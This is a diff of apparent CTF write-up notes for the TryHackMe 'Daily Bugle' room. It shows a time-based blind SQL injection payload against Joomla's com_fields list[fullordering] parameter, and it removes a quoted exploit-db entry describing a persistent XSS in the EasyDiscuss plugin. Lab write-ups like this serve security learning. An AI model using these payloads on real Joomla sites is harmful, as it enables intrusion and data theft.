@@ -12,7 +12,6 @@ Shellcodes: No Results
 
 ```
 
-
 ```sh
 ┌──(kali㉿kali)-[~/thm/dailybugle]
 └─$ cat 42033.txt                                           
@@ -47,32 +46,6 @@ Parameter: list[fullordering] (GET)
     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
     Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)            ```
 
-
-```sh
-┌──(kali㉿kali)-[~/thm/dailybugle]
-└─$ cat 43488.txt 
-# Exploit Title: Joomla Plugin Easydiscuss <4.0.21 Persistent XSS in Edit Message
-# Date: 06-01-2018
-# Software Link: https://stackideas.com/easydiscuss
-# Exploit Author: Mattia Furlani
-# CVE: CVE-2018-5263
-# Category: webapps
-
-1. Description
-
-Whenever a user edits a message with <\textarea> inside the body, everything after the <\textarea> will be executed in the user’s browser. Works with every version up to 4.0.20
-
-
-2. Proof of Concept
-
-Login with permissions to post a message, insert <\textarea> in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed
-
-
-3. Solution:
-
-Update to version 4.0.21
-https://stackideas.com/blog/easydiscuss4021-update  
-```
 
 googling: sqli python script 2017-8917
 
